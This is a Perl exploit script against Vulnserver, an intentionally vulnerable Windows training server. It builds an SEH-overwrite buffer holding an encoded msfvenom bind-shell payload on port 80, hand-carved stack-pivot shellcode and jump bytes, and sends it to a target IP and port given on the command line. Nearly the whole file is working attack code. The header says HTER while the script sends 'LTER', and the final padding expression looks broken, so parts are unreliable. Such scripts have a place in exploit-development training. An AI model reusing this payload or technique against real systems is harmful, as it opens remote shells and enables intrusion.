#!/usr/bin/perl

# Vulnserver HTER exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows XP Professional Version 2002 Service Pack 3

use IO::Socket;

if($ARGV[0] eq ''){
die("Proper usage $0 IP_ADDRESS PORT \n\n");
}

$badheader = "LTER .";
$baddata = "\x41" x 2646; # exact offset 3498 bytes

# msfvenom -p windows/shell_bind_tcp LPORT=80 -f perl -v baddata -b "\x00" -e x86/alpha_mixed BUFFERREGISTER=ESP EXITFUNC=thread
# 710 bytes

$baddata .= "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" .
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" .
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x6b\x58" .
"\x6d\x52\x47\x70\x43\x30\x75\x50\x31\x70\x4d\x59\x79\x75" .
"\x76\x51\x79\x50\x31\x74\x6c\x4b\x42\x70\x46\x50\x4c\x4b" .
"\x62\x72\x64\x4c\x4e\x6b\x33\x62\x37\x64\x4e\x6b\x43\x42" .
"\x57\x58\x76\x6f\x4e\x57\x63\x7a\x46\x46\x75\x61\x49\x6f" .
"\x4e\x4c\x45\x6c\x61\x71\x61\x6c\x77\x72\x34\x6c\x35\x70" .
"\x6a\x61\x5a\x6f\x36\x6d\x36\x61\x4f\x37\x4d\x32\x6c\x32" .
"\x61\x42\x63\x67\x4e\x6b\x71\x42\x44\x50\x4e\x6b\x71\x5a" .
"\x77\x4c\x6e\x6b\x52\x6c\x54\x51\x73\x48\x38\x63\x72\x68" .
"\x63\x31\x4e\x31\x32\x71\x6e\x6b\x72\x79\x57\x50\x47\x71" .
"\x4e\x33\x4c\x4b\x52\x69\x74\x58\x49\x73\x77\x4a\x70\x49" .
"\x4e\x6b\x35\x64\x6e\x6b\x33\x31\x68\x56\x46\x51\x59\x6f" .
"\x6e\x4c\x79\x51\x58\x4f\x64\x4d\x55\x51\x38\x47\x46\x58" .
"\x79\x70\x63\x45\x68\x76\x37\x73\x53\x4d\x6b\x48\x47\x4b" .
"\x73\x4d\x74\x64\x34\x35\x58\x64\x36\x38\x6e\x6b\x36\x38" .
"\x51\x34\x47\x71\x39\x43\x30\x66\x6e\x6b\x64\x4c\x50\x4b" .
"\x4c\x4b\x52\x78\x47\x6c\x53\x31\x4a\x73\x6c\x4b\x63\x34" .
"\x4c\x4b\x63\x31\x6e\x30\x6d\x59\x77\x34\x45\x74\x54\x64" .
"\x51\x4b\x51\x4b\x61\x71\x51\x49\x71\x4a\x62\x71\x6b\x4f" .
"\x59\x70\x31\x4f\x63\x6f\x50\x5a\x6c\x4b\x57\x62\x5a\x4b" .
"\x4c\x4d\x33\x6d\x62\x48\x67\x43\x70\x32\x35\x50\x65\x50" .
"\x63\x58\x42\x57\x72\x53\x74\x72\x71\x4f\x43\x64\x55\x38" .
"\x42\x6c\x44\x37\x35\x76\x55\x57\x59\x6f\x6a\x75\x6f\x48" .
"\x7a\x30\x37\x71\x65\x50\x75\x50\x65\x79\x78\x44\x33\x64" .
"\x32\x70\x65\x38\x54\x69\x6d\x50\x32\x4b\x65\x50\x4b\x4f" .
"\x39\x45\x62\x4a\x35\x58\x51\x49\x66\x30\x6d\x32\x59\x6d" .
"\x47\x30\x42\x70\x57\x30\x72\x70\x45\x38\x4a\x4a\x66\x6f" .
"\x59\x4f\x4d\x30\x6b\x4f\x5a\x75\x4a\x37\x75\x38\x74\x42" .
"\x47\x70\x77\x70\x52\x70\x6f\x79\x4b\x56\x51\x7a\x76\x70" .
"\x72\x76\x36\x37\x55\x38\x4b\x72\x39\x4b\x45\x67\x72\x47" .
"\x39\x6f\x4e\x35\x56\x37\x43\x58\x4d\x67\x79\x79\x56\x58" .
"\x39\x6f\x4b\x4f\x48\x55\x66\x37\x73\x58\x61\x64\x4a\x4c" .
"\x67\x4b\x59\x71\x39\x6f\x7a\x75\x43\x67\x6a\x37\x75\x38" .
"\x52\x55\x52\x4e\x72\x6d\x71\x71\x4b\x4f\x6e\x35\x52\x48" .
"\x43\x53\x72\x4d\x35\x34\x45\x50\x6f\x79\x69\x73\x53\x67" .
"\x53\x67\x72\x77\x65\x61\x4b\x46\x72\x4a\x46\x72\x62\x79" .
"\x71\x46\x4b\x52\x79\x6d\x33\x56\x49\x57\x32\x64\x51\x34" .
"\x37\x4c\x73\x31\x66\x61\x4c\x4d\x43\x74\x65\x74\x32\x30" .
"\x58\x46\x35\x50\x51\x54\x56\x34\x72\x70\x36\x36\x30\x56" .
"\x73\x66\x62\x66\x73\x66\x42\x6e\x71\x46\x43\x66\x52\x73" .
"\x51\x46\x30\x68\x73\x49\x78\x4c\x35\x6f\x6d\x56\x39\x6f" .
"\x5a\x75\x4b\x39\x6b\x50\x70\x4e\x31\x46\x42\x66\x79\x6f" .
"\x70\x30\x33\x58\x67\x78\x6b\x37\x57\x6d\x33\x50\x69\x6f" .
"\x48\x55\x4d\x6b\x6d\x30\x55\x4d\x65\x7a\x76\x6a\x33\x58" .
"\x4d\x76\x4a\x35\x4d\x6d\x4f\x6d\x4b\x4f\x6e\x35\x47\x4c" .
"\x43\x36\x33\x4c\x77\x7a\x4b\x30\x39\x6b\x6b\x50\x70\x75" .
"\x44\x45\x4f\x4b\x52\x67\x46\x73\x63\x42\x30\x6f\x73\x5a" .
"\x57\x70\x56\x33\x79\x6f\x6a\x75\x41\x41";

$baddata .= "\x41" x 18;

$baddata .= "\x54\x58\x66\x05\x62\x11\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x1F\x41\x17\x25\x2D\x7F\x41\x02\x25\x2D\x5F\x7E\x01\x25\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x1E\x14\x5B\x4A\x2D\x3E\x35\x5C\x4A\x2D\x3E\x35\x5C\x4A\x50"; # 60 bytes moving ESP and carving SUB ESP 320 and JMP ESP

$baddata .= "B" x 64;

$baddata .= "\x4c\x4c\x77\xFF"; # JMP back 127 bytes 1st stage payload
$baddata .= "\x0b\x12\x50\x62"; # POP ECX POP ECX RET

$baddata .= "B" x (5000-length($3150));

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die"Cannot connect to server";

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata);
